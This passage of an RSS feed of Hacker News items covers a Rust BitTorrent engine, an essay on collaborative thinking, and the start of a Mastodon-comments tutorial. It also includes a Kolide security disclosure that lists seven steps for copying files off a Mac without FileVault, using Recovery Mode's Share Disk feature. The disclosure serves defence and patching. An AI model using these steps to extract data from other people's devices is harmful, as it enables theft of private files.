</code></pre></div><p>The 1 second value was chosen for simplicity, but it’s a reasonable guess if we
take the link to mean the full request round-trip from one peer’s disk to that
of another.</p>
<h3 id="slow-start">Slow start</h3>
<p>The above suggests an interesting problem: what’s the fastest way of
arriving at the link’s capacity? Taking time to get to this optimum number costs
time. No good.</p>
<p>It turns out that this is a solved problem. To find the answer we just have
to peek one layer below in the network stack: <strong>TCP</strong>.</p>
<p>When a TCP connection is set up, the protocol tries to find the right congestion
window size. This is a fancy way of saying “the number of bytes to send that
doesn’t choke the remote host and everything else in between but still makes use
of the network capacity.” Our purposes are similar.</p>
<p>This is roughly what TCP does:</p>
<ol>
<li>At the start of the connection, set the congestion window size to some
constant.</li>
<li>Send an equivalent number of segments to peer.</li>
<li>For each ACK (acknowledgement message) received, increase the window size by
1.</li>
</ol>
<p>Each time all ACKs are received for a volley of segments, the window size
doubles. This growth is exponential, yet the algorithm is confusingly called
<a href="https://en.wikipedia.org/wiki/TCP_congestion_control#Slow_start">slow start</a>
(presumably named after the thing it tries to avoid).</p>
<p>TCP stops growing the window when the first timed out or dropped segment is
detected. This would be difficult to replicate in user-space, so cratetorrent
instead increases the request queue size every time a block is received, and
<a href="https://github.com/mandreyel/cratetorrent/blob/master/cratetorrent/src/peer/state.rs#L300-L316">stops</a>
when the download rate isn’t increasing much anymore.<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p>
<figure>
  <img src="https://mandreyel.github.io/images/cratetorrent-slow-start.svg" alt="download pipelining benefits">
</figure>



<p>With each served request, more requests are sent, and the connection is getting
closer to fully using the available bandwidth (the non-blue area is shrinking).</p>
<h3 id="endgame-mode">Endgame mode</h3>
<p>I noticed that sometimes the last phase of a download gets stagnant, barely
progressing from one block to the next.</p>
<p>This happens when the last pending pieces are downloaded from slow peers, which
can delay the completion of a download by a surprising amount.<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup></p>
<p>Similarly, this issue is also solved–mentioned in the spec, in fact:</p>
<p>While normally each block is requested from a single peer, blocks in the last
pending pieces should be downloaded from all peers, on a “whoever sends it
first” basis. Once they arrive, requests to the slower peers are simply
cancelled. This wastes some bandwidth but saves quite a bit of time.</p>
<hr>
<p>These were the most significant design choices in terms of how they affected
performance. There are a few more but neither you or I have forever. So let’s
move on and see how all this translates into Rust.</p>
<h2 id="architecture">Architecture</h2>
<p>Cratetorrent employs asynchronous IO on the network side, and a thread-pool
backed blocking IO on the disk side. It uses
<a href="https://github.com/tokio-rs/tokio">Tokio</a> for both, the de facto async IO
runtime in Rust.</p>
<p>The engine’s main components are:</p>
<ul>
<li>The <strong>engine</strong> itself, which manages torrents and executes the library user’s
commands.</li>
<li>One or more <strong>torrents</strong>, each corresponding to a single torrent
upload/download. They manage their peers and trackers.</li>
<li>Torrents have an arbitrary number of <strong>peer sessions</strong>, which represent
connections with peers from start to finish. This entity implements the
BitTorrent wire protocol and is as such on the lowest layer.</li>
<li><strong>Disk IO</strong> is handled by an entity of its own, for clarity and separation of
concerns.</li>
</ul>
<p>All of these are separate <a href="https://docs.rs/tokio/0.2.13/tokio/task">tasks</a>
(essentially application level <a href="https://en.wikipedia.org/wiki/Green_threads">green
threads</a>). Because tasks are
as good as separate threads from the point of view of the borrow-checker, shared
access is not permitted without synchronization. There are two ways to do that.</p>
<h3 id="task-event-loop">Task event loop</h3>
<p>Control flow between tasks is primarily implemented via asynchronous <a href="https://en.wikipedia.org/wiki/Message_passing"><em>message
passing</em></a>, using
multiple-producer single-consumer
<a href="https://tokio.rs/tokio/tutorial/channels"><em>channels</em></a>. Each task is
reactive: it has an <em>event loop</em> and it reacts to internal events and messages
from other tasks.</p>
<p>Torrents and peer sessions perform a periodic “tick” (like the tick of a clock),
once a second currently, to update their internal state and broadcast messages.
This is when alerts (such as periodic download statistics or “download
complete”) are sent to the library user for example.<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup></p>
<p>A torrent’s event loop might look like this:</p>
<div><pre><code data-lang="rust"><span>loop</span> {
    select<span>!</span> {
        <span>// periodic tick
</span><span></span>        _ <span>=</span> tick_timer.select_next_some() <span>=&gt;</span> {
            self.tick().<span>await</span><span>?</span>;
        }
        <span>// peers wanting to connect
</span><span></span>        peer_conn_result <span>=</span> incoming.select_next_some() <span>=&gt;</span> {
            <span>if</span> <span>let</span> Ok(socket) <span>=</span> peer_conn_result {
                self.handle_incoming_peer(socket)<span>?</span>;
            }
        }
        <span>// commands from other parts of the engine
</span><span></span>        cmd <span>=</span> self.cmd_rx.select_next_some() <span>=&gt;</span> {
            self.handle_cmd(cmd).<span>await</span><span>?</span>;
        }
    }
}
</code></pre></div><p>(<code>select!</code> is a macro that waits on all streams and returns the item produced by
the first ready stream. And streams are just types that eventually produce a
<em>stream</em> of values over time.)</p>
<p>Another component in the engine might …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mandreyel.github.io/posts/rust-bittorrent-engine/">https://mandreyel.github.io/posts/rust-bittorrent-engine/</a></em></p>]]>
            </description>
            <link>https://mandreyel.github.io/posts/rust-bittorrent-engine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572039</guid>
            <pubDate>Tue, 29 Dec 2020 17:14:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Collaborative Thinking]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25572029">thread link</a>) | @jackyzhao
<br/>
December 29, 2020 | https://blog.jzhao.xyz/posts/collaborative-thinking/ | <a href="https://web.archive.org/web/*/https://blog.jzhao.xyz/posts/collaborative-thinking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="postTitle"><p>written December 28, 2020 // 1246 words</p></div><div id="mainText"><p>Recently, I’ve been reading <strong>21 Lessons for the 21st Century</strong> written by none other than Yuval Noah Harari, and have been enjoying the book. Its approach to weaving together insights from a vast number of disciplines to create something novel is extremely refreshing. I just read a section on learning, the knowledge illusion, and collaborative thinking and wanted to share some of my thoughts that have been bouncing around and marinating for a few days as well as some learnings that I’ve applied to my own life.</p><h2 id="collaborative-thinking">Collaborative Thinking</h2><blockquote><p>Humans rarely think for themselves. Rather, we think in groups. Just as it takes a tribe to raise a child, it also takes a tribe to invent a tool, solve a conflict, or cure a disease. No individual knows everything it takes to build a cathedral, an atom bomb, or an aircraft.</p></blockquote><p>It is no secret that the key to the rise of <em>Homo Sapiens</em> and the anthropocene wasn’t due to the rationality of any individual human, but rather our collective unparalleled ability to think and share knowledge in large groups. This concept has arisen in the form of <em>specialization of labour</em>.</p><p>As a society, we consistently rely on the knowledge of others to live our own comfortable lives. I may not know how to grow my very own russet potatoes, but a farmer in Alberta might. Similarly, a plumber in Massachusetts may not know how to build their own website, but I might. Through being able to supplement each other’s knowledge of the world, our <em>collective</em> knowledge is much greater.</p><p><img src="https://blog.jzhao.xyz/img/knowledge.png" alt="Left: Collective knowledge of the group. Right: My subset of knowledge"><em>Left: Collective knowledge of the group. Right: My subset of knowledge</em></p><p>I like to think about collective knowledge as a big blob. Each individual contributes a unique <em>subset</em> of knowledge. We get the entirety of human knowledge by taking the <em>union of the knowledge</em> of all the individuals in the group. Of course, as these groups of individuals grow ever larger due to globalization, each individual may choose to specialize in a narrower subset of knowledge as generations go on to reduce redundancy. Why know how to build your own car when you can buy it yourself? The adoption of globally accepted currencies has made this easier than ever.</p><h2 id="knowledge-illusion">Knowledge illusion</h2><p>Humans also have this ‘knowledge illusion’ where we think we know a lot, even though individually we know very little. We treat the knowledge of the human collective as if it were our own, even subconsciously.</p><p><img src="https://blog.jzhao.xyz/img/zipper.png" alt="A crude illustration of a jacket zipper"><em>A crude illustration of a jacket zipper</em></p><p>An example Harari used was the sweater zipper. If I were to ask you if you knew how a zipper works, the vast majority of you would exclaim “yes, of course!” Yet, if asked to describe in <em>detail</em> every single step, most would fail to do so. Even with something that seems so basic and intuitive seems to elude an explicit explanation. We have begun to stand on the shoulders of giants yet refuse to acknowledge their presence.</p><p>Although we may have increased the overall area of our collective knowledge, the surface area of each individual has also shrunken, turning from balanced and broad to narrow and unwieldy.</p><h2 id="rebalancing-our-blob-of-knowledge">Rebalancing our blob of knowledge</h2><p>Another interesting property about the knowledge blobs of individuals is that they are <em>magnetic</em>. I mean this in the sense that individuals that have one blob of knowledge tend to attract and be attracted to individuals with similar orientations and shapes in their blobs of knowledge, much like how magnetic dipoles align in a magnet. As humans, we tend to want to minimize our cognitive dissonance and surrounding ourselves with like-minded individuals is the easiest way to do that.</p><p>Individuals in these clusters experience a sort of echo chamber effect whereby the <em>magnitude</em> of their knowledge is amplified through the mutual alignment of their knowledge. However, this also poses a unique challenge where movement only happens in one direction and there is little to no room to deviate from that direction and try something new; something incredibly dangerous for innovation. This, in a sense, is turning collaborative thinking into groupthink.</p><blockquote><p>People afraid of losing their truth tend to be more violent than people who are used to looking at the world from several different viewpoints.</p></blockquote><p><img src="https://blog.jzhao.xyz/img/spikes.png" alt="Broadening our base fundamental knowledge. Blue: Previous ‘specialized’ knowledge. Purple: broad foundational knowledge"><em>Blue: Previous ‘specialized’ knowledge. Purple: broad foundational knowledge</em></p><p>What we can do to counteract this extreme alignment is to build a broader foundation of knowledge. When you come across an individual with differing views, hopefully you will at least have the base fundamental knowledge to understand their perspective.</p><h2 id="learning-communities">Learning communities</h2><p>This, at least in part, is why I’ve recently become more certain of wanting to go to grad school in the future. I used to have tunnel-vision in thinking that all I wanted to do in the future was to just work in industry CS. Recently, I’ve started to realize that CS not a single discipline, but rather it’s a tool that can help solve uniquely human problems, and these human problems are inherently multidisciplinary.</p><p>I’ve started to read and learn more about the world around me outside of my little bubble of CS-related topics and it’s been eye-opening to see issues I read about in my philosophy class come up in a linguistics lecture which in turn comes up in a book I’m reading. I’ve found that the best way for me to cement my learning and understanding is through discussion with people, rather than just sitting and ruminating on my own – a very different pace than the typical <em>code-Stackoverflow-copy-repeat</em> self-learning cycle that most programmers (including myself) are familiar with.</p><p>The important part of learning communities like colleges is not necessarily the alignment in what you’re studying, but rather in the shared mindset of discussion, learning, and understanding. To broaden my foundation of knowledge is to read more about the opinions and findings of others and to critically discuss these among peers who may have different views. If we want our specialized knowledge to be applicable in a wide range of situations, we need a broad foundational base that can support that.</p><h2 id="wiggle-room">Wiggle room</h2><blockquote><p>If you want to go deeply into any subject, you need a lot of time, and in particular, you need the privilege of wasting time. You need to experiment with unproductive paths, explore dead ends, make space for doubts and boredom, and allow little seeds of insight to slowly grow and blossom</p></blockquote><p>For me, learning is very close to a zero-sum game. I can only expand the area of my knowledge blob so fast. If I want to broaden my foundational knowledge base, I need to reign in the amount of time spent growing purely technical strengths and to stop saying ‘yes’ to any and every opportunity that comes up.</p><p>Slowly but surely, I’m learning to value my own time and to set it aside to just absorb more about the world and to extend the reaches of my knowledge just a little bit further. To dilly-dally among the Wikipedia rabbit holes and faff among the ridiculously long list of side projects I planned to start. I’m experimenting with what I previously thought were deadends and little seeds of insight are starting to grow. Maybe I’ll find something interesting to share among the construction of this broader foundation.</p><p><strong>Acknowledgements</strong></p><p>A big thank yu to <a href="https://twitter.com/ansonyuu">Anson</a> for always being a sounding board for fresh dough (half-baked ideas would be too generous of a description for these). Thanks to <a href="https://www.linkedin.com/in/anneguo3/">Anne</a> and <a href="https://twitter.com/y1huen">Joice</a> for also giving feedback on rough drafts :))</p></div></div>]]>
            </description>
            <link>https://blog.jzhao.xyz/posts/collaborative-thinking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572029</guid>
            <pubDate>Tue, 29 Dec 2020 17:14:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[M1 Macs SSD “Encryption” trivially bypassed unless FileVault is enabled]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25570876">thread link</a>) | @terracatta
<br/>
December 29, 2020 | https://blog.kolide.com/modern-macs-still-need-filevault-d5e2f55c083b | <a href="https://web.archive.org/web/*/https://blog.kolide.com/modern-macs-still-need-filevault-d5e2f55c083b">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="b46e">Built-in Mac SSD Encryption Is Easily Bypassed by an Attacker With Physical Access if Filevault Isn’t Enabled</h2><div><div><div><p><a href="https://medium.com/@fritz_?source=post_page-----d5e2f55c083b--------------------------------" rel="noopener"><img alt="Fritz Ifert-Miller" src="https://miro.medium.com/fit/c/96/96/0*m1fK8ctg-lpc-4R5." width="48" height="48"></a></p></div></div></div><p id="0760">If you buy a modern Mac in 2020, it is going to come with a special physical component called the Secure Enclave. This component enables Apple to carry over many popular iOS features which require extra hardware security like Touch ID and Apple Pay to the Mac.</p><p id="4f7b">One of the lesser-known features of the Secure Enclave is that it performs automatic hardware based encryption of a Mac’s built-in SSD. This means that without any user intervention, your new Mac is encrypted right out of the packaging. With this fact in mind, you may be wondering if taking the extra step of enabling FileVault is still necessary? I am here to tell you, <strong>yes, it is absolutely </strong>necessary<strong>.</strong></p><p id="c7b9">An encrypted Mac without FileVault allows anyone who has physical access to your device to trivially read your personal data. They don’t even need to know your password. Even worse, some tools used to detect FileVault’s status (like <a href="http://osquery.io/" rel="noopener">osquery</a>), can conflate the differences between <strong>Encrypted</strong> versus <strong>FileVault On</strong> causing you to believe the data on your Mac is safe, when in fact, it’s unprotected from the most common scenarios wherein we rely on encryption to save us.</p><p id="6c62">In this article we will review the current situation, the steps you should take to ensure you are correctly polling this information, and how we are patching osquery to resolve this confusion.</p><ul><li id="5e11">The osquery <code>disk_encryption</code> table as of December 20th, 2020, reports a value of <code>encrypted = 1</code> for <strong>all T2 and M1 Macs</strong>, <em>regardless of the FileVault status</em>. This information is technically correct, but has likely resulted in inaccurate interpretations about FileVault’s status.</li><li id="138f">Kolide determined that the SSD of Encrypted Macs without FileVault can be trivially accessed with simple physical access to the device.</li><li id="df8d">Kolide <a href="https://github.com/kolide/launcher/pull/686" rel="noopener">shipped a hotfix for its own customers</a> with a new launcher table <code>kolide_filevault_status</code>, and amended its Check to address the issue.</li><li id="ce2e">Kolide <a href="https://github.com/osquery/osquery/pull/6823" rel="noopener">shipped a patch for the osquery</a> <code>disk_encryption</code> table to include a new column: <code>filevault_status</code></li></ul><p id="0577">For 30 years, Apple has included a tool with its operating systems called ‘Target Disk Mode’. This utility allowed a user to mount the disk of one Apple device, on another device as a network volume. There are a variety of reasons this functionality is helpful, the most common being, the retrieval of data on a Mac that no longer boots successfully.</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7944/1*Wj0OSxfGZSjBylDsV7W3tA.png" width="3972" height="2130" srcset="https://miro.medium.com/max/552/1*Wj0OSxfGZSjBylDsV7W3tA.png 276w, https://miro.medium.com/max/1104/1*Wj0OSxfGZSjBylDsV7W3tA.png 552w, https://miro.medium.com/max/1280/1*Wj0OSxfGZSjBylDsV7W3tA.png 640w, https://miro.medium.com/max/1456/1*Wj0OSxfGZSjBylDsV7W3tA.png 728w, https://miro.medium.com/max/1632/1*Wj0OSxfGZSjBylDsV7W3tA.png 816w, https://miro.medium.com/max/1808/1*Wj0OSxfGZSjBylDsV7W3tA.png 904w, https://miro.medium.com/max/1984/1*Wj0OSxfGZSjBylDsV7W3tA.png 992w, https://miro.medium.com/max/2000/1*Wj0OSxfGZSjBylDsV7W3tA.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*Wj0OSxfGZSjBylDsV7W3tA.png?q=20"></p></div></div></div><figcaption>Apple’s built in Target Disk Mode makes it stupid easy to dump the entire contents of an “encrypted” Mac that doesn’t have FileVault enabled</figcaption></figure></div></div></div><div><div><p id="8058">However, using macOS’s Target Disk Mode an attacker with physical access to a device can trivially access the contents of the disk by physically connecting it to another computer and booting it in Recovery Mode. So while that disk may <em>‘Actually’</em> be Encrypted at Rest thanks to the Secure Enclave, it is completely vulnerable to data exfiltration so long as FileVault has not been configured.</p><p id="cf96">How easy is this you might wonder? In our testing you can start pulling down a target device’s files in less than 3 minutes:</p><ol><li id="9189">Shut down and Boot the target device into Recovery Mode (either by holding <strong>⌘</strong>+R or on M1 Macs by holding the Power button)</li><li id="f30f">Once in Recovery Mode (On M1 Macs): Click <strong>Options</strong></li><li id="7be3">Under the <strong>Utilities</strong> dropdown, select <strong>Share Disk</strong></li><li id="fb30">Connect your target device to the recipient device using a Thunderbolt 3 USB-C cable</li><li id="958b">Select your internal hard disk and click <strong>Start Sharing</strong></li><li id="7c0f">In Finder on your recipient device, click MacBook Pro under Locations &gt; Network</li><li id="8883">Copy any desired target files.</li></ol></div></div><div><figure><div role="button" tabindex="0"><div><p><img alt="Image for post" src="https://miro.medium.com/max/17472/1*3x1n9ncea8MM7tCNpDNm-Q.png" width="8736" height="1800" srcset="https://miro.medium.com/max/552/1*3x1n9ncea8MM7tCNpDNm-Q.png 276w, https://miro.medium.com/max/1104/1*3x1n9ncea8MM7tCNpDNm-Q.png 552w, https://miro.medium.com/max/1280/1*3x1n9ncea8MM7tCNpDNm-Q.png 640w, https://miro.medium.com/max/1456/1*3x1n9ncea8MM7tCNpDNm-Q.png 728w, https://miro.medium.com/max/1632/1*3x1n9ncea8MM7tCNpDNm-Q.png 816w, https://miro.medium.com/max/1808/1*3x1n9ncea8MM7tCNpDNm-Q.png 904w, https://miro.medium.com/max/1984/1*3x1n9ncea8MM7tCNpDNm-Q.png 992w, https://miro.medium.com/max/2160/1*3x1n9ncea8MM7tCNpDNm-Q.png 1080w, https://miro.medium.com/max/2700/1*3x1n9ncea8MM7tCNpDNm-Q.png 1350w, https://miro.medium.com/max/3240/1*3x1n9ncea8MM7tCNpDNm-Q.png 1620w, https://miro.medium.com/max/3780/1*3x1n9ncea8MM7tCNpDNm-Q.png 1890w, https://miro.medium.com/max/4320/1*3x1n9ncea8MM7tCNpDNm-Q.png 2160w, https://miro.medium.com/max/4800/1*3x1n9ncea8MM7tCNpDNm-Q.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*3x1n9ncea8MM7tCNpDNm-Q.png?q=20"></p></div></div><figcaption>Recovery Mode on Target Device</figcaption></figure></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/8640/1*aDaV6pcNG06lVl85Dpe4XQ.png" width="4320" height="1308" srcset="https://miro.medium.com/max/552/1*aDaV6pcNG06lVl85Dpe4XQ.png 276w, https://miro.medium.com/max/1104/1*aDaV6pcNG06lVl85Dpe4XQ.png 552w, https://miro.medium.com/max/1280/1*aDaV6pcNG06lVl85Dpe4XQ.png 640w, https://miro.medium.com/max/1456/1*aDaV6pcNG06lVl85Dpe4XQ.png 728w, https://miro.medium.com/max/1632/1*aDaV6pcNG06lVl85Dpe4XQ.png 816w, https://miro.medium.com/max/1808/1*aDaV6pcNG06lVl85Dpe4XQ.png 904w, https://miro.medium.com/max/1984/1*aDaV6pcNG06lVl85Dpe4XQ.png 992w, https://miro.medium.com/max/2000/1*aDaV6pcNG06lVl85Dpe4XQ.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*aDaV6pcNG06lVl85Dpe4XQ.png?q=20"></p></div></div></div><figcaption>Accessing Networked Target Disk on Recipient Device</figcaption></figure></div></div></div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2130/0*wuXZO932LT8m43_I" width="1065" height="590" srcset="https://miro.medium.com/max/552/0*wuXZO932LT8m43_I 276w, https://miro.medium.com/max/1104/0*wuXZO932LT8m43_I 552w, https://miro.medium.com/max/1280/0*wuXZO932LT8m43_I 640w, https://miro.medium.com/max/1400/0*wuXZO932LT8m43_I 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*wuXZO932LT8m43_I?q=20"></p></div></div></div></figure><p id="a9ce">In 2018, Apple introduced a slate of Macs with a new security co-processor called <strong>T2</strong>. With this new Secure Enclave CPU, Apple moved from a pattern of software encryption (FileVault2) to automatic hardware encryption. In 2020, on the newly introduced Apple Silicon Macs, a similar Secure Enclave is built right into the M1 SoC.</p><p id="24db">Both the T2 and the M1 Secure Enclave securely store a 256-bit AES key (UID) which cannot be directly accessed and is burnt into the chip, protecting both the SSD’s data and the TouchID sensor’s stored fingerprints, as well as disabling the device’s camera and microphone when the computer is locked.</p><p id="fe41">What this means in practice, is that the data on a Mac’s disk cannot be accessed once the disk is physically separated from the Mac or if the underlying encryption key is lost. In fact, if your Secure Enclave is damaged or wiped, this encryption will prevent you from accessing any of the contents of the drive. This is yet another failure mode one must negate with backups (<a href="https://support.apple.com/en-ae/guide/mac-help/mh11421/11.0/mac/11.0" rel="noopener">which come with their own encryption considerations</a>)</p><p id="74e6">Before the introduction of the T2 security chip, disk encryption was synonymous with FileVault configuration on macOS. However, with hardware encryption this distinction became multi-faceted. This nuance was particularly problematic for security agents that did not differentiate between a disk that was ‘encrypted’ and a device that had FileVault configured.</p><p id="b412">Unfortunately, osquery fell into that camp, and its <code>disk_encryption</code> table simply returned a boolean value for the column <code>encrypted</code>, leading many to draw an erroneous conclusion causing a false sense of security.</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*1t7if31l-fcAGmX1" width="1600" height="1029" srcset="https://miro.medium.com/max/552/0*1t7if31l-fcAGmX1 276w, https://miro.medium.com/max/1104/0*1t7if31l-fcAGmX1 552w, https://miro.medium.com/max/1280/0*1t7if31l-fcAGmX1 640w, https://miro.medium.com/max/1456/0*1t7if31l-fcAGmX1 728w, https://miro.medium.com/max/1632/0*1t7if31l-fcAGmX1 816w, https://miro.medium.com/max/1808/0*1t7if31l-fcAGmX1 904w, https://miro.medium.com/max/1984/0*1t7if31l-fcAGmX1 992w, https://miro.medium.com/max/2000/0*1t7if31l-fcAGmX1 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/0*1t7if31l-fcAGmX1?q=20"></p></div></div></div><figcaption>Osquery conflates the differences between FileVault and Encryption in its `disk_encryption` virtual table leading to False Negatives</figcaption></figure></div></div></div><div><div><p id="8637">This issue was discovered when the output of common macOS terminal utilities (<code>diskutil apfs list</code> and <code>fdesetup status</code>) returned different information from what was observed when querying devices using osquery.</p><p id="c10b">This issue proved initially difficult to track down, due to the false-negative nature. It is often easier to track down a coding issue producing a false-positive but an intermittent false negative can be truly maddening. Because users are encouraged during setup to configure FileVault on new devices it is uncommon to see devices without it, this coupled with the fact that the table worked as expected on older hardware, led to a difficulty in establishing a pattern and subsequently a lag-time in discovery.</p><p id="1e06">Fortunately with some additional reverse engineering of Kolide <a href="https://github.com/kolide/launcher/pull/686" rel="noopener">updated its own agent</a> and <a href="https://github.com/osquery/osquery/pull/6823" rel="noopener">Osquery itself</a> to report this data accurately. At the time of this writing the Osquery core-team has not issued an official release containing this fix, but building the agent yourself should net the new column you need.</p><p id="d7e3">Since publishing this article, I have gotten some feedback suggesting I am making a mountain out of a molehill. The most common critique that I have encountered is:</p><blockquote><p id="5929">“Isn’t it basically impossible to setup a device without FileVault in 2020?”</p></blockquote></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3756/1*tcL0VdjLNnX2h18RWJSTPQ.png" width="1878" height="612" srcset="https://miro.medium.com/max/552/1*tcL0VdjLNnX2h18RWJSTPQ.png 276w, https://miro.medium.com/max/1104/1*tcL0VdjLNnX2h18RWJSTPQ.png 552w, https://miro.medium.com/max/1280/1*tcL0VdjLNnX2h18RWJSTPQ.png 640w, https://miro.medium.com/max/1456/1*tcL0VdjLNnX2h18RWJSTPQ.png 728w, https://miro.medium.com/max/1632/1*tcL0VdjLNnX2h18RWJSTPQ.png 816w, https://miro.medium.com/max/1808/1*tcL0VdjLNnX2h18RWJSTPQ.png 904w, https://miro.medium.com/max/1984/1*tcL0VdjLNnX2h18RWJSTPQ.png 992w, https://miro.medium.com/max/2000/1*tcL0VdjLNnX2h18RWJSTPQ.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*tcL0VdjLNnX2h18RWJSTPQ.png?q=20"></p></div></div></div></figure></div></div></div><div><div><p id="5fc3">While I would love for this to be the case, it is actually surprisingly easy to configure a device without Enabling FileVault.</p><p id="0170">I was similarly skeptical when I first encountered this situation; certainly only someone with intent and know-how could avoid FileVault.</p><p id="5443">To verify I wiped and then setup an M1 MacBook from a blank-slate. The step where FileVault would have been enabled was gated by connecting an AppleID. No mention of FileVault was made and no warning was given when the step was opted out:</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/12144/1*rQ50UpxIv2fuTz5xtiWjmw.png" width="6072" height="1800" srcset="https://miro.medium.com/max/552/1*rQ50UpxIv2fuTz5xtiWjmw.png 276w, https://miro.medium.com/max/1104/1*rQ50UpxIv2fuTz5xtiWjmw.png 552w, https://miro.medium.com/max/1280/1*rQ50UpxIv2fuTz5xtiWjmw.png 640w, https://miro.medium.com/max/1456/1*rQ50UpxIv2fuTz5xtiWjmw.png 728w, https://miro.medium.com/max/1632/1*rQ50UpxIv2fuTz5xtiWjmw.png 816w, https://miro.medium.com/max/1808/1*rQ50UpxIv2fuTz5xtiWjmw.png 904w, https://miro.medium.com/max/1984/1*rQ50UpxIv2fuTz5xtiWjmw.png 992w, https://miro.medium.com/max/2000/1*rQ50UpxIv2fuTz5xtiWjmw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*rQ50UpxIv2fuTz5xtiWjmw.png?q=20"></p></div></div></div></figure></div></div></div></section></div></div>]]>
            </description>
            <link>https://blog.kolide.com/modern-macs-still-need-filevault-d5e2f55c083b</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570876</guid>
            <pubDate>Tue, 29 Dec 2020 15:49:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adding comments to a static blog with Mastodon]]>
            </title>
            <description>
<![CDATA[
Score 263 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25570268">thread link</a>) | @ognarb
<br/>
December 29, 2020 | https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/ | <a href="https://web.archive.org/web/*/https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>

    
</header>


  <section>
    <p>One of the biggest disadvantages of static site generators is that
they are static and can’t include comments.</p>
<p>There are multiples solutions to solve this problem. You could add
a third party blog engine like Disqus, but this has the drawback
of including a third-party tool with a bad privacy record in your
website. Another solution would be to host an open-source alternative
but this comes at the cost of a higher maintenance burden. Having
to host a database was something we wanted to avoid with a
static site generator.</p>
<p>In my opinion, a better solution is to leverage the Mastodon and
Fediverse platform. Mastodon is a decentralized social network
and it allows people to communicate with each other without
being on the same server. It is inspired by Twitter, but instead
of tweeting, you write toot.</p>
<p>When publishing an article, you now only need to also write a
simple toot linking to your article. Then Mastodon has a simple
API to fetch the answer to your toot. This is the code I made for
my Hugo powered blog, but it is easily adaptable for other static
site generators. It will create a button to load comments instead
of loading them for every visitor so that it decreases the load on your
mastodon server.</p>
<div><pre><code data-lang="html">{{ with .Params.comments }}
<span>&lt;</span><span>div</span> <span>class</span><span>=</span><span>"article-content"</span><span>&gt;</span>
  <span>&lt;</span><span>h2</span><span>&gt;</span>Comments<span>&lt;/</span><span>h2</span><span>&gt;</span>
  <span>&lt;</span><span>p</span><span>&gt;</span>You can use your Mastodon account to reply to this <span>&lt;</span><span>a</span> <span>class</span><span>=</span><span>"link"</span> <span>href</span><span>=</span><span>"https://{{ .host }}/@{{ .username }}/{{ .id }}"</span><span>&gt;</span>post<span>&lt;/</span><span>a</span><span>&gt;</span>.<span>&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>p</span><span>&gt;&lt;</span><span>a</span> <span>class</span><span>=</span><span>"button"</span> <span>href</span><span>=</span><span>"https://{{ .host }}/interact/{{ .id }}?type=reply"</span><span>&gt;</span>Reply<span>&lt;/</span><span>a</span><span>&gt;&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>p</span> <span>id</span><span>=</span><span>"mastodon-comments-list"</span><span>&gt;&lt;</span><span>button</span> <span>id</span><span>=</span><span>"load-comment"</span><span>&gt;</span>Load comments<span>&lt;/</span><span>button</span><span>&gt;&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>noscript</span><span>&gt;&lt;</span><span>p</span><span>&gt;</span>You need JavaScript to view the comments.<span>&lt;/</span><span>p</span><span>&gt;&lt;/</span><span>noscript</span><span>&gt;</span>
  <span>&lt;</span><span>script</span> <span>src</span><span>=</span><span>"/assets/js/purify.min.js"</span><span>&gt;&lt;/</span><span>script</span><span>&gt;</span>
  <span>&lt;</span><span>script</span> <span>type</span><span>=</span><span>"text/javascript"</span><span>&gt;</span>
    <span>function</span> <span>escapeHtml</span><span>(</span><span>unsafe</span><span>)</span> <span>{</span>
      <span>return</span> <span>unsafe</span>
           <span>.</span><span>replace</span><span>(</span><span>/&amp;/g</span><span>,</span> <span>"&amp;amp;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/&lt;/g</span><span>,</span> <span>"&amp;lt;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/&gt;/g</span><span>,</span> <span>"&amp;gt;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/"/g</span><span>,</span> <span>"&amp;quot;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/'/g</span><span>,</span> <span>"&amp;#039;"</span><span>);</span>
   <span>}</span>

